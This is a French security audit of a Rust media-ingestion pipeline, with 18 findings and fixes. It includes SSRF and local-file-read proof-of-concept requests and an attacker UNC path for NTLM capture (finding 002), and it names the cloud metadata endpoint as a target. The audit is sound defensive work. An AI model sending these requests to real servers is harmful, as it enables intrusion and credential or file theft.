# Audit A4 — Pipeline média (SSRF, sous-processus, quotas)

- **Auditeur** : `infra-rust` (audit indépendant, n'a pas écrit cette lane)
- **Date** : 2026-11-10
- **Dépôt** : `C:\Users\SuperKnacky\code\LiveChat`, branche `feat/rust-rebuild`
- **Périmètre** : `crates/lc-media/**`, `apps/lc-server/src/media/**`, `apps/lc-server/src/http/ingest/**`, service `GET /overlay/media/:assetId`, `apps/lc-server/src/media_url.rs`
- **Mode** : lecture statique exhaustive + preuves dynamiques sur le binaire `target/debug/lc-server.exe` (version 3.0.0, protocole 2, schéma SQLite 3.0.0)
- **Hors périmètre** : rendu overlay/Tauri, extension Chromium, panel admin, lane Discord, protocole WS
- **Aucun code modifié, aucun commit.** Artefacts de reproduction : `.phase0/audit/A4/`.

---

## 1. Résumé exécutif

Le pipeline média est fonctionnellement abouti (étages resolve → download → probe → transcode → storage → DB, 11 codes d'erreur legacy, jeton d'ingestion haché, service média confiné). En revanche, **la surface d'entrée réseau n'a aucune défense SSRF** et **le schéma `file:` permet de lire et de servir des fichiers locaux arbitraires**. Les deux vulnérabilités ont été reproduites de bout en bout avec le binaire réel.

| ID | Sévérité | Confiance | Titre |
|----|----------|-----------|-------|
| AUD-A4-001 | **Élevée** (Critique en contexte cloud) | Élevée (PoC) | SSRF authentifiée via le champ `url` de `POST /ingest` (aucun filtre d'IP, redirections suivies) |
| AUD-A4-002 | **Élevée** | Élevée (PoC) | Lecture de fichiers locaux + SMB/UNC sortant via le schéma `file:` (exfiltration par URL signée) |
| AUD-A4-003 | Moyenne | Élevée (PoC partiel) | Redirections HTTP suivies sans revalidation de l'hôte/IP |
| AUD-A4-004 | Moyenne | Moyenne | Type réel non vérifié : `image/svg+xml` accepté, images copiées sans ré-encodage, MIME distant stocké puis servi |
| AUD-A4-005 | Moyenne | Moyenne | Réponses HTTP, pages HTML et JSON non bornées (mémoire/CPU) |
| AUD-A4-006 | Moyenne | Élevée | Sous-processus : pas de kill de l'arbre, pas d'annulation, buffers non bornés |
| AUD-A4-007 | Moyenne | Élevée | Stockage non atomique + course sur `source_hash` + fenêtre `remove_variants` |
| AUD-A4-008 | Moyenne | Élevée | Aucun worker de purge : lignes FAILED/PROCESSING et fichiers partiels jamais nettoyés |
| AUD-A4-009 | Moyenne | Moyenne | Coût non borné par client : téléchargement complet avant contrôle de budget, pas de rate limit par client |
| AUD-A4-010 | Faible | Élevée | `Content-Type` distant de confiance → type stocké puis servi tel quel |
| AUD-A4-011 | Faible/Moyenne | Élevée | ffprobe/ffmpeg/yt-dlp exécutés sur entrées non fiables sans sandbox ni limites |
| AUD-A4-012 | Faible | Moyenne | Injection d'options ffprobe via un chemin local commençant par `-` |
| AUD-A4-013 | Faible | Élevée | Cookie TikTok écrit dans un fichier Netscape sans échappement (injection de ligne) |
| AUD-A4-014 | Faible | Élevée | Confinement `resolve_media_file` désactivé silencieusement si la racine ne se canonicalise pas |
| AUD-A4-015 | Faible | Élevée | `sanitize_embed_html` ne retire que `<script>`/`<iframe>` (latent : `TweetCard.html` non exposé aujourd'hui) |
| AUD-A4-016 | Faible | Élevée | Couverture de tests réseau : 4 tests tous `#[ignore]`, aucun test SSRF/`file:`/redirection |
| AUD-A4-017 | Faible | Moyenne | Durée de job non bornée si la guilde n'a pas de `max_media_time` |
| AUD-A4-018 | Info | Élevée | Clé de cache = URL canonique : contenu obsolète possible tant que le TTL court |

**Total : 2 Élevées, 7 Moyennes, 9 Faibles/Info.** Effort de remédiation estimé : **10 à 13 j-h** (les deux Élevées ≈ 2 j-h).

## 2. Méthode

1. Lecture intégrale de `crates/lc-media/src` (14 fichiers + `resolve/`) et de la couche serveur média (10 fichiers) + soumission `http/ingest` (5 fichiers).
2. Vérification croisée des invariants par `grep` (filtrage d'IP, appelants de purge, usages de `TweetCard`, MIME svg).
3. Reproduction dynamique :
   - binaire existant `target/debug/lc-server.exe` lancé sur `127.0.0.1:18080` avec `DATABASE_URL=file:./.phase0/audit/A4/probe.db`, `MEDIA_STORAGE_DIR=.phase0/audit/A4/storage`, `MEDIA_URL_SECRET=a4-probe-secret` ;
   - client d'ingestion de test inséré avec `token` haché SHA-256 (même mécanique que `media/tokens.rs`) via `.phase0/audit/A4/seed_ingest_client.py` ;
   - serveur piège local `127.0.0.1:18081` (`.phase0/audit/A4/sink_server.py`) qui journalise chaque requête dans `sink.log` ;
   - URL signée calculée avec le format gelé `assetId|clientId|exp` (`crates/lc-protocol/src/lib.rs:169-171`, `apps/lc-server/src/media_url.rs:48-57`).
4. Tout ce qui n'a pas pu être exécuté sans risque (UNC/SMB, `169.254.169.254`, charge volumineuse) est marqué **statique** (preuve fichier:ligne uniquement).

## 3. Architecture du pipeline (rappel)

```
POST /ingest (Bearer token client, submit.rs:116-133)
  └─ MediaService::ingest (media/service.rs:98-167)
       ├─ MediaSource::from_raw (source.rs:101-120)         ← AUCUN filtre de schéma/hôte
       ├─ assets::find_reusable (cache DB + fichier)         ← hit si READY et non expiré
       ├─ assets::begin_processing (INSERT/UPDATE PROCESSING)
       ├─ MediaPipeline::ingest_url (ingest.rs:118-143)
       │    ├─ resolve_media (réseau : oEmbed, syndication, short URL)
       │    ├─ download_source (download.rs:62-82)
       │    │    ├─ download_local      (file:, download.rs:104-165)   ← lecture locale
       │    │    ├─ download_http       (redirections 10, download.rs:390-505)
       │    │    └─ download_with_ytdlp (process.rs:41-89 → child process)
       │    ├─ storage.ensure + remove_variants (ingest.rs:146-197)
       │    ├─ normalize_downloaded_media (transcode.rs:81-107 → ffprobe/ffmpeg)
       │    └─ storage (content-addressed, écriture directe)
       └─ quotas::enforce_cache_budget puis assets::mark_ready (service.rs:151-166)
```

Le service `GET /overlay/media/:assetId?clientId&exp&sig` (`http/overlay/media.rs`) sert ensuite le fichier stocké avec `Content-Type = asset.mime` et `Cache-Control: no-store`.

---

## 4. Findings

### AUD-A4-001 — SSRF authentifiée via le champ `url` de `POST /ingest` (aucun filtre d'IP, redirections suivies)

- **Sévérité** : Élevée (Critique si le serveur tourne dans un cloud avec service de métadonnées). **Confiance** : Élevée (PoC complet).
- **Composants** : `crates/lc-media/src/source.rs`, `http.rs`, `download.rs` ; `apps/lc-server/src/http/ingest/submit.rs` ; `apps/lc-server/src/media/service.rs`.
- **Preuve statique** :
  - `crates/lc-media/src/source.rs:101-120` : `MediaSource::from_raw` accepte **toute chaîne non vide** ;
  - `crates/lc-media/src/source.rs:253-277` : tout `http`/`https` de n'importe quel hôte devient `SourceKind::DirectMedia` ;
  - `crates/lc-media/src/http.rs:15-27` : `reqwest` configuré avec `.redirect(reqwest::redirect::Policy::limited(10))`, **aucune vérification d'IP** ;
  - `crates/lc-media/src/download.rs:390-505` : `download_http` fait un GET direct et écrit la réponse ;
  - `apps/lc-server/src/http/ingest/submit.rs:116-133` : le champ `url` du corps JSON part sans contrôle vers `MediaService::ingest` ;
  - `grep` : aucune occurrence de `is_loopback`/`IpAddr::is_private`/`to_socket_addrs` dans `crates/lc-media` (seuls l'admin, le CORS et le rate-limit filtrent le loopback).
- **Preuve dynamique** (serveur piège `127.0.0.1:18081`, token d'ingestion de test) :

```
POST http://127.0.0.1:18080/ingest
Authorization: Bearer A4PROBE-0123456789abcdef
Content-Type: application/json
{"guildId":"123456789012345678","url":"http://127.0.0.1:18081/leak.png"}

→ HTTP 201 {"accepted":true,"guildId":"123456789012345678","hasMedia":true,...}
→ .phase0/audit/A4/sink.log : "GET /leak.png -> 200"    (5 requêtes au total)
→ DB : media_assets ... storage_path=...\storage\<hash>.png size_bytes=12420 status=READY
→ variante http://localhost:18081/leak.png : acceptée aussi (résolution DNS non filtrée)
```

- **Impact** : un client d'ingestion valide (extension appairée, donc un utilisateur) peut faire émettre au serveur des requêtes GET/HEAD arbitraires vers :
  - `127.0.0.0/8`, `::1` (services locaux, panneau admin, autres instances) ;
  - RFC1918 / IPv6 ULA (réseau interne de l'utilisateur) ;
  - link-local `169.254.0.0/16` dont `169.254.169.254/latest/meta-data/` (identifiants cloud) ;
  - tout port TCP en `http`/`https` (scan réseau via différences de latence/codes d'erreur).
  La réponse est stockée dans le média storage si elle ressemble à un média ; sinon les erreurs (`DOWNLOAD_FAILED`, `PRIVATE_OR_AUTH_REQUIRED`, statuts HTTP) fuient de l'information.
- **Correctif** : ajouter un garde-fou SSRF central (`crates/lc-media/src/http.rs`) :
  1. n'accepter que `http`/`https` (déjà le cas de fait, voir AUD-A4-012) ;
  2. résoudre le nom (`tokio::net::lookup_host`) et rejeter loopback, privé, link-local, CGNAT, multicast, unspecified, IPv4-mapped-IPv6, `169.254.169.254`, `fd00::/8` ;
  3. revalider **à chaque saut** de redirection (policy custom) ;
  4. optionnel : allowlist de suffixes d'hôtes (tiktok.com, cdninstagram…), ports 80/443, `MEDIA_SSRF_ALLOW_PRIVATE` pour un mode LAN explicite ;
  5. refuser `file:` sauf chemin contrôlé (AUD-A4-002).
- **Test de régression** : test d'intégration `crates/lc-media/tests/network.rs` (dé-`#[ignore]`) lançant un serveur local, puis `assert` que `ingest_url(http://127.0.0.1:PORT/...)` échoue avec un code `DOWNLOAD_FAILED`/`PRIVATE_OR_AUTH_REQUIRED` **sans** requête reçue par le serveur local ; test unitaire table-driven pour le classifieur IP (v4/v6/ULA/mapped).
- **Effort** : 1–1,5 j-h.

### AUD-A4-002 — Lecture de fichiers locaux + SMB/UNC sortant via `file:` (exfiltration par URL signée)

- **Sévérité** : Élevée. **Confiance** : Élevée (PoC complet).
- **Composants** : `crates/lc-media/src/source.rs:142-144`, `download.rs:104-165`, `transcode.rs:110-127` ; `apps/lc-server/src/http/overlay/media.rs:132-148`.
- **Preuve statique** :
  - `source.rs:142-144` : `canonicalize_source_url` renvoie tel quel tout préfixe `file:` ;
  - `download.rs:104-165` : `local_path_from_url` accepte `file:C:\...`, `file:///...`, `file:\\hôte\partage\...` ; `fs::metadata` + taille ; **aucune canonicalisation ni confinement** (à comparer avec `resolve_media_file` du service média qui, lui, canonicalise et vérifie le préfixe) ;
  - `transcode.rs:110-127` : `normalize_image` = `fs::copy` sans validation ;
  - `http/overlay/media.rs:132-148` : sert tout asset READY avec une URL signée.
- **Preuve dynamique** :

```
POST /ingest  {"guildId":"123456789012345678","url":"file:C:/Windows/Web/Wallpaper/Windows/img0.jpg"}
→ 201 accepted
→ media_assets : mime=image/jpeg, size_bytes=1602752, status=READY
URL signée calculée pour un client overlay de test :
GET /overlay/media/bb54d992-...?clientId=...&exp=...&sig=...
→ HTTP 200, bytes=1602752, Content-Type: image/jpeg
→ SHA-256 du corps = SHA-256 du fichier Windows = A37491A5E479E191CFE547B484426037455CE8AACFF7AB15F91925330C24864F
```

  (fichier exfiltré conservé : `.phase0/audit/A4/exfil-wallpaper.jpg`)
- **Impact** : tout fichier local lisible par le processus serveur **et dont l'extension correspond à un MIME média connu** (jpg/png/gif/webp/avif/bmp/mp3/mp4…) est copié dans le storage puis exfiltrable via le flux média normal. En environnement Windows, `file:\\attaquant\partage\x.png` déclenche une **connexion SMB sortante** (capture de hash NTLM) ; non exécuté ici pour ne pas émettre de trafic réseau, preuve statique (`PathBuf` UNC accepté sans contrôle).
- **Correctif** :
  1. rejeter `file:` par défaut (mode « ingestion réseau ») ; sinon le restreindre à `MEDIA_LOCAL_IMPORT_DIR` : canonicaliser (`dunce::canonicalize`/`std::fs::canonicalize`) et exiger le préfixe, refuser les préfixes UNC (`\\`, `//`), les périphériques (`\\.\`), et les composants `..` ;
  2. ouvrir le fichier une seule fois (`File::open`) et **transmettre le handle** au probe/transcode (évite le TOCTOU et la réouverture de chemin) ;
  3. documenter le retrait du support `file:` côté extension ou le réserver au mode local-only.
- **Test de régression** : test négatif `file:C:\Windows\win.ini` → code d'erreur explicite ; test positif dans un dossier autorisé ; test `file:\\127.0.0.1\share\x.png` refusé.
- **Effort** : 0,5–1 j-h.

### AUD-A4-003 — Redirections HTTP suivies sans revalidation de l'hôte/IP

- **Sévérité** : Moyenne. **Confiance** : Élevée (PoC partiel).
- **Preuve** : `crates/lc-media/src/http.rs:19` (`Policy::limited(10)`) ; redirection loopback→loopback suivie et asset READY : `sink.log` contient `GET /redirect -> 302` puis `GET /leak.png -> 200` ; `source.rs:292-295` : `resolve_short_url` renvoie l'URL finale **sans** vérifier l'hôte (utilisé pour `vm.tiktok.com`), puis `resolve_source` reclasse le résultat sans contrôle (une redirection TikTok vers une URL interne deviendrait `DirectMedia`).
- **Impact** : contourne un futur allowlist d'hôtes de premier niveau ; permet aussi d'utiliser un host public légitime comme rebond. **Correctif** : policy de redirection custom qui applique le garde-fou SSRF à chaque saut ; désactiver les redirections cross-scheme/cross-host par défaut. **Test** : redirection depuis un serveur local vers un second port local → doit échouer. **Effort** : inclus dans AUD-A4-001 (≈ 0,5 j-h de plus).

### AUD-A4-004 — Type réel non vérifié : `image/svg+xml` accepté, images copiées sans ré-encodage, MIME distant stocké puis servi

- **Sévérité** : Moyenne. **Confiance** : Moyenne.
- **Preuve** :
  - `crates/lc-media/src/source.rs:350-369` : `kind_from_mime` mappe **tout** `image/*` → `MediaKind::Image` (donc `image/svg+xml` inclus) ;
  - `crates/lc-media/src/transcode.rs:110-127` : `normalize_image` copie aveuglément, extension par défaut `png` si non mappée (`extension_from_mime` sans `svg`, `source.rs:372-400`) ;
  - `crates/lc-media/src/transcode.rs:51-68` : si ffprobe échoue, `detect_kind` retombe sur le `Content-Type` **fourni par le serveur distant** ;
  - `apps/lc-server/src/http/overlay/media.rs` : `Content-Type` de réponse = `asset.mime` stocké.
- **Impact** : un serveur piégé peut faire stocker du SVG (ou un polyglotte HTML/SVG) qui sera servi depuis l'origine API avec `image/svg+xml`. La CSP globale (`script-src 'self'`, `object-src 'none'`, `nosniff`) réduit fortement l'exploitation, mais c'est une défense unique et non testée pour ce cas ; un futur assouplissement CSP ou un autre client (navigateur vers l'URL signée) exposerait un XSS stocké sur l'origine API (où le token admin est en `localStorage`).
- **Correctif** : whitelist d'images `png/jpeg/gif/webp/avif/bmp` (pas de SVG) ; **ré-encoder** les images (decode → encode) plutôt que copier ; dériver le `Content-Type` du probe interne, jamais du pair distant ; ajouter `Content-Disposition: attachment` pour tout type non image/vidéo/audio. **Test** : URL renvoyant `content-type: image/svg+xml` → rejet `UNSUPPORTED_MEDIA` ; content-type menteur `image/png` sur du HTML → rejet. **Effort** : 0,5–1 j-h.

### AUD-A4-005 — Réponses HTTP, pages HTML et JSON non bornées (mémoire/CPU)

- **Sévérité** : Moyenne. **Confiance** : Moyenne.
- **Preuve** : `crates/lc-media/src/http.rs:41-74` et `:145` : `response.text()` / `response.json()` sans plafond ; `crates/lc-media/src/html.rs:96-138` : `meta_content`/`script_payload` rescannent `html[tag_start..].find('>')` à chaque balise non fermée (potentiel O(n²) sur page volumineuse) ; `resolve/tiktok.rs:211-242` : page TikTok complète en mémoire ; `resolve/youtube.rs:124-145` : stdout `--dump-json` complet.
- **Impact** : DoS mémoire/CPU si une réponse énorme est atteinte (page plateforme compromise, open redirect TikTok vers une page gigantesque, ou futur allowlist d'hôtes). **Correctif** : plafonner chaque lecture (ex. 8 Mio, `resp.bytes_stream()` + compteur), borner le JSON, parser en streaming si possible, timeout par phase. **Test** : serveur local renvoyant 100 Mio → erreur propre mémoire bornée. **Effort** : 0,5 j-h.

### AUD-A4-006 — Sous-processus : pas de kill de l'arbre, pas d'annulation, buffers non bornés

- **Sévérité** : Moyenne. **Confiance** : Élevée.
- **Preuve** : `crates/lc-media/src/process.rs:41-89` : `kill_on_drop(true)` + `tokio::time::timeout(timeout, child.wait_with_output())` mais **aucun kill/wait explicite après timeout**, pas de process group/job object ⇒ les petits-enfants (ffmpeg lancé par yt-dlp pour le merge) survivent ; stdout/stderr `piped()` bufferisés intégralement en mémoire ; `crates/lc-media/src/ingest.rs` : aucun `CancellationToken`, aucun timeout global (seuls les sous-processus ont un timeout, chacun jusqu'à 180 s, et YouTube peut enchaîner jusqu'à 3 tentatives) ; `SIGINT`/shutdown : le drain 30 s peut abandonner une ingestion en cours (fichiers partiels, cf. AUD-A4-007/008).
- **Impact** : DoS disque/CPU (processus orphelins, tentatives longues), orphelins sous Windows (pas de récupération automatique), fichiers temporaires laissés. **Correctif** : `tokio::process::Command` + job object Windows (`windows` crate, `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`) / `setsid`+`killpg` Unix ; drainer les pipes avec plafond ; propager un `CancellationToken` depuis le handler jusqu'à `download`/`transcode` ; deadline globale du pipeline ; à l'expiration, kill tree puis wait. **Test** : commande de test qui lance un enfant lent, timeout court, vérifier que l'enfant et le petit-enfant ne tournent plus. **Effort** : 1–2 j-h.

### AUD-A4-007 — Stockage non atomique + course sur `source_hash` + fenêtre `remove_variants`

- **Sévérité** : Moyenne. **Confiance** : Élevée.
- **Preuve** : `crates/lc-media/src/ingest.rs:175` : `storage.remove_variants(&source.source_hash)` est appelé **avant** le transcodage ⇒ un asset READY existant est effacé avant que le remplaçant n'existe (échec de transcode = média perdu) ; `crates/lc-media/src/storage.rs` : écriture directe du fichier final (`fs::copy`/ffmpeg), pas de tmp+rename, pas de fsync ; deux ingestions concurrentes du même hash (`forceRefresh=true` ou cache miss avec fichier manquant) se suppriment/écrasent mutuellement ; le service média peut servir un fichier en cours d'écriture.
- **Impact** : 404/503 transitoires côté overlay, fichiers corrompus, taille DB ≠ taille disque, perte de média sur échec. **Correctif** : single-flight par `source_hash` (map de `tokio::sync::Mutex`/`Notify`) ; écrire dans `<hash>.<ext>.tmp` puis `rename` atomique (Windows : `ReplaceFile`/`MoveFileEx`) + fsync ; supprimer les anciennes variantes après le rename ; verrouiller la lecture (`READY` seulement) ; ne jamais supprimer avant succès. **Test** : 2 tâches concurrentes même URL → un seul asset, un seul fichier, intègre. **Effort** : 1 j-h.

### AUD-A4-008 — Aucun worker de purge : lignes FAILED/PROCESSING et fichiers partiels jamais nettoyés

- **Sévérité** : Moyenne. **Confiance** : Élevée.
- **Preuve** : `apps/lc-server/src/media/quotas.rs:190-202` (`purge_candidates`) et `:206-228` (`evict_source_hashes`) sont **définis mais sans aucun appelant** (`grep` : seules la définition et les tests) ; `apps/lc-server/src/media/assets.rs:31,35` définit `STALE_PROCESSING_TTL=2h` et `FAILED_TTL=1h` mais rien ne les applique ; pas de worker planifié côté `lc-server` (seuls hooks d'ingestion). **Impact** : avec un token valide, accumuler des `FAILED`/`PROCESSING` (croissance DB) et des fichiers partiels/temporaires (croissance disque), indépendamment du cache LRU (qui ne voit que les assets READY). **Correctif** : câbler un worker `tokio::time::interval` (ex. 10 min) qui purge FAILED > 1 h, PROCESSING > 2 h, `purge_candidates`, fichiers orphelins du storage (scan vs DB) ; métriques. **Test** : insérer une ligne FAILED ancienne → purge ; fichier sans ligne → supprimé. **Effort** : 0,5–1 j-h.

### AUD-A4-009 — Coût non borné par client : téléchargement complet avant contrôle de budget, pas de rate limit par client

- **Sévérité** : Moyenne. **Confiance** : Moyenne.
- **Preuve** : `apps/lc-server/src/media/service.rs:151-166` : `quotas::enforce_cache_budget` est appelé **après** `pipeline.ingest_url` (donc après un téléchargement de 2 Gio max) ; `crates/lc-media/src/ingest.rs:36-72` : sémaphore global 2 ; `apps/lc-server/src/http/ingest/submit.rs` : aucune limite par client d'ingestion (le rate limit observé est par IP, 100 req/min, en-têtes `x-ratelimit-limit: 100`) ; `forceRefresh` contourne le cache ; pas de déduplication des ingestions en vol ; `MEDIA_MAX_SIZE_MB=2048` par fichier mais aucun plafond journalier/par client.
- **Impact** : un client (ou plusieurs) peut saturer bande passante/CPU/disque et forcer des évictions en boucle. **Correctif** : rate limit par client d'ingestion (token) ; quota d'octets téléchargés par fenêtre ; `HEAD`/`Content-Length` pré-vol ; dedupe in-flight par hash ; budget vérifié avant le téléchargement quand une estimation est disponible. **Test** : 3 ingestions simultanées même client → refus `429`/`MEDIA...` attendu. **Effort** : 1 j-h.

### AUD-A4-010 — `Content-Type` distant de confiance → type stocké puis servi tel quel

- **Sévérité** : Faible. **Confiance** : Élevée.
- **Preuve** : `crates/lc-media/src/download.rs:411-419` : seul `text/html` est refusé, tout autre type passe ; `transcode.rs:51-68` et `:138-163` : kind/MIME dérivés du Content-Type si le probe échoue ; `asset.mime` est ensuite renvoyé en `Content-Type`. **Impact** : confusion de type, contenu actif si le type déclaré est `image/*` (cf. AUD-A4-004) ; pas d'exécution serveur. **Correctif** : type de sortie dérivé uniquement du probe + transcodage ; ignorer le Content-Type distant pour la décision finale (le garder pour l'erreur seulement). **Test** : content-type menteur sur HTML/SVG → rejet. **Effort** : inclus AUD-A4-004.

### AUD-A4-011 — ffprobe/ffmpeg/yt-dlp exécutés sur entrées non fiables sans sandbox ni limites

- **Sévérité** : Faible/Moyenne (risque accepté mais à documenter). **Confiance** : Élevée.
- **Preuve** : `crates/lc-media/src/transcode.rs` et `probe.rs` passent des fichiers téléchargés arbitraires à ffprobe/ffmpeg ; `crates/lc-media/src/process.rs:41-89` : pas de sandbox (AppContainer/seccomp), pas de rlimit, pas de `-protocol_whitelist file`, pas de contrôle des versions ; `crates/lc-media/src/download.rs:215-253` : yt-dlp reçoit des URLs Internet (comportement attendu). **Impact** : un média malformé peut exploiter une CVE de décodeur ; l'attaque reste locale (exécution sous l'utilisateur du serveur). **Correctif** : exécuter sous compte à privilèges minimaux, binaires maintenus à jour et épinglés (chemin + hash), `-protocol_whitelist file,pipe` (ffmpeg), `-max_alloc`, `-threads 2`, pas de réseau pour ffmpeg, scan de version au démarrage. **Effort** : 1 j-h (infra).

### AUD-A4-012 — Injection d'options ffprobe via un chemin local commençant par `-`

- **Sévérité** : Faible. **Confiance** : Moyenne.
- **Preuve** : `crates/lc-media/src/probe.rs:82-93` : le chemin local est le dernier argument positionnel de `ffprobe` (`-v error ... -of json <path>`) ; `file:-version` donne `PathBuf("-version")`, interprété comme option. Impact limité (erreur, sortie non JSON) car un seul argument est injectable ; pas d'exécution de commande. Combiné à `file:` (AUD-A4-002) un attaquant peut choisir l'option, mais sans valeur associée. **Correctif** : préfixer le chemin (ex. `./` relatif ou `file:` URI) ou utiliser `-i` (ffprobe n'accepte pas `-i`; utiliser `--` si supporté par la version, sinon canonicaliser et vérifier l'absence de `-` initial). **Effort** : 0,1 j-h.

### AUD-A4-013 — Cookie TikTok écrit dans un fichier Netscape sans échappement

- **Sévérité** : Faible. **Confiance** : Élevée.
- **Preuve** : `crates/lc-media/src/download.rs:648-664` : `write_cookie_file` écrit `name=value` par ligne ; `parse_cookie_pairs` amont ne filtre pas `\n`/`\r` ; `TIKTOK_COOKIE` vient d'env/`admin_runtime.json` (admin). **Impact** : injection de lignes cookies (ou options du format Netscape) si la valeur contient un saut de ligne ; nécessite un accès admin. **Correctif** : rejeter `\r\n`/`\t` dans les valeurs, tronquer, écrire avec ACL restreinte (tempfile crée 0600 Unix ; vérifier Windows). **Effort** : 0,2 j-h.

### AUD-A4-014 — Confinement `resolve_media_file` désactivé silencieusement si la racine ne se canonicalise pas

- **Sévérité** : Faible. **Confiance** : Élevée.
- **Preuve** : `apps/lc-server/src/http/overlay/media.rs:219-262` : canonicalise le stockage et le fichier, vérifie `starts_with` ; **si la racine ne se canonicalise pas** (dossier absent/lecteur réseau), il log un `warn` et sert sans vérification de préfixe (chemin issu de la DB). **Impact** : faible (la DB est locale et fiable), mais casse la défense en profondeur. **Correctif** : refuser (404/500) plutôt que skip ; faire échouer le démarrage si `MEDIA_STORAGE_DIR` est introuvable. **Effort** : 0,1 j-h.

### AUD-A4-015 — `sanitize_embed_html` ne retire que `<script>` et `<iframe>` (latent)

- **Sévérité** : Faible (non exposé aujourd'hui). **Confiance** : Élevée.
- **Preuve** : `crates/lc-media/src/html.rs:322-325` ; `grep tweet_card` dans `apps/lc-server/src` : uniquement `ws/tests.rs:882` et `media/assets.rs:349` (valeur `None`) ⇒ le HTML de carte tweet n'est pas transmis par le serveur actuel ; il pourrit en Phase 4b/overlay (rendu HTML). **Impact** : XSS stocké dans la webview overlay si le HTML est rendu via `innerHTML`, avec `<img onerror>`, `<style>`, `<object>`, `<base>`… **Correctif** : soit ne pas exposer de HTML (données structurées), soit assainir avec une allowlist stricte (tags/attributs) côté résolveur ; test avec corpus XSS. **Effort** : 0,5 j-h (reporté Phase 4b).

### AUD-A4-016 — Couverture de tests réseau insuffisante

- **Sévérité** : Faible. **Confiance** : Élevée.
- **Preuve** : `crates/lc-media/tests/network.rs` : 4 tests **tous `#[ignore]`** ; aucun test pour SSRF, redirections, `file:`, taille de réponse, cancellation, course de hash. **Correctif** : serveur HTTP de test local (tokio) + tests `#[timeout]` ; couper le réseau en CI par défaut et marquer les tests réseau `#[ignore]` explicitement. **Effort** : 0,5 j-h.

### AUD-A4-017 — Durée de job non bornée si la guilde n'a pas de `max_media_time`

- **Sévérité** : Faible. **Confiance** : Moyenne.
- **Preuve** : `apps/lc-server/src/media/jobs.rs` : `durationSec` explicite est seulement clampé par `guild.max_media_time` s'il existe ; sinon `duration.max(1)` sans borne haute ; la durée vient d'un client authentifié. **Impact** : job à durée démesurée (affichage/timer overlay), ressource de playback bloquée. **Correctif** : borne haute configurable (ex. 6 h) appliquée à toute durée. **Effort** : 0,1 j-h.

### AUD-A4-018 — Clé de cache = URL canonique (contenu obsolète)

- **Sévérité** : Info. **Preuve** : `crates/lc-media/src/source.rs:129-133` (`source_hash=sha256(canonical_url)`), `assets::find_reusable` ; `forceRefresh` permet de forcer. **Impact** : une même URL (ex. lien `vm.tiktok.com` réutilisé, vidéo remplacée) sert l'ancien contenu pendant le TTL (12 h / pinned). Pas une vulnérabilité. **Correctif** : documenter ; éventuellement hash de contenu + ETag plateforme. **Effort** : —.

---

## 5. Points forts

- **Erreurs legacy normalisées** : 11 codes `MediaErrorCode` avec priorités, `raw_message` tronqué à 2 000 caractères, message court à 500 (`crates/lc-media/src/error.rs:18-21,28-90`), mapping API `media_ingestion_failed` + code (`http/ingest/mod.rs:75-102`) — pas de fuite de sortie brute vers le client.
- **Service média confiné** : `resolve_media_file` canonicalise et vérifie le préfixe (défaut : skip si racine introuvable, cf. AUD-A4-014) ; `Content-Type` contrôlé, `Cache-Control: no-store`, Range/HEAD géré (`http/overlay/media.rs`).
- **Storage content-addressed** : `sanitize_hash` neutralise tout caractère hors `[a-z0-9_-]` (`crates/lc-media/src/storage.rs:220-234`) ⇒ pas de traversal via le hash.
- **Jetons d'ingestion** : 32 octets aléatoires, stockés en SHA-256 hex, comparaison par lookup (`apps/lc-server/src/media/tokens.rs`), pas de token en clair en base.
- **Cache LRU** : protège les médias épinglés (board) et actifs (jobs PENDING/PLAYING) (`crates/lc-media/src/cache.rs`).
- **Résolveurs réseau bornés** : profondeur de parcours JSON limitée, nombre de candidats plafonné, regex linéaire (pas de ReDoS), Unicode/ASCII géré (`resolve/tiktok.rs`, `resolve/twitter.rs`).
- **`#![forbid(unsafe_code)]`** dans `lc-media` ; aucune désérialisation non bornée de données de confiance autre que JSON plateformes.
- **Tests offline** corrects (HTTP simulé, yt-dlp factice) — la couverture manque seulement pour les cas réseau/abus.

## 6. Couverture par étage

| Étage | Fichiers audités | Verdict |
|-------|------------------|---------|
| Soumission /ingest | `submit.rs`, `body.rs`, `auth.rs`, `pair.rs`, `mod.rs` | Auth/validation correctes ; `url` non filtrée (001), `file:` accepté (002) |
| Resolve | `source.rs`, `resolve/*` | Classification correcte ; pas de garde SSRF ; short URL non revalidée (003) |
| Download | `download.rs`, `http.rs`, `process.rs` | Redirections non filtrées (001/003), pas de plafond réponse (005), `file:` (002), sous-processus (006) |
| Probe | `probe.rs`, `transcode.rs` | Injection d'option théorique (012), pas de sandbox (011) |
| Transcode | `transcode.rs` | Copie image sans validation (004/010), pas d'atomicité (007) |
| Storage | `storage.rs`, `ingest.rs` | Content-addressed solide ; écriture non atomique/race (007) |
| DB / cycle de vie | `assets.rs`, `service.rs`, `quotas.rs` | Transitions PROCESSING→READY→FAILED correctes ; purge absente (008), quota tardif (009) |
| Service média | `http/overlay/media.rs`, `media_url.rs` | Signature HMAC v2 correcte (format `assetId|clientId|exp`), confinement perfectible (014) |
| Jobs / board | `jobs.rs`, `board.rs` | Déduplication et quotas board corrects ; durée non bornée (017) |

## 7. Zones non couvertes / limites

- **UNC/SMB** et `169.254.169.254` : preuve statique seulement (pas de trafic réseau émis volontairement depuis la machine d'audit).
- **Yt-dlp/ffmpeg réels** : pas de test avec binaires absents/présents ni de version ; comportement supposé d'après le code.
- **Rendu overlay** du HTML de carte tweet : hors périmètre (Phase 4b) → AUD-A4-015 latent.
- **Charge volumineuse** (2 Gio, concurrence, eviction sous pression) : non exécutée (temps/CPU) ; raisonnement statique.
- **WS/lane protocole-v2** : émission des URLs signées, révocation en cours de lecture : hors périmètre.
- **Rate limiting** : vérifié par en-têtes (`x-ratelimit-limit: 100`) mais pas testé en rafale.

## 8. Reproduction (artefacts)

Tout est sous `.phase0/audit/A4/` (scripts + base + logs + fichier exfiltré) :

```powershell
# 1. serveur piège
python .phase0\audit\A4\sink_server.py          # 127.0.0.1:18081, log sink.log

# 2. serveur LiveChat (binaire déjà construit)
$env:API_URL="http://127.0.0.1:18080"; $env:PORT="18080"
$env:DATABASE_URL="file:./.phase0/audit/A4/probe.db"
$env:MEDIA_STORAGE_DIR="C:\Users\SuperKnacky\code\LiveChat\.phase0\audit\A4\storage"
$env:MEDIA_URL_SECRET="a4-probe-secret"
.\target\debug\lc-server.exe

# 3. client d'ingestion de test
python .phase0\audit\A4\seed_ingest_client.py .phase0\audit\A4\probe.db A4PROBE-0123456789abcdef

# 4. SSRF loopback (AUD-A4-001)
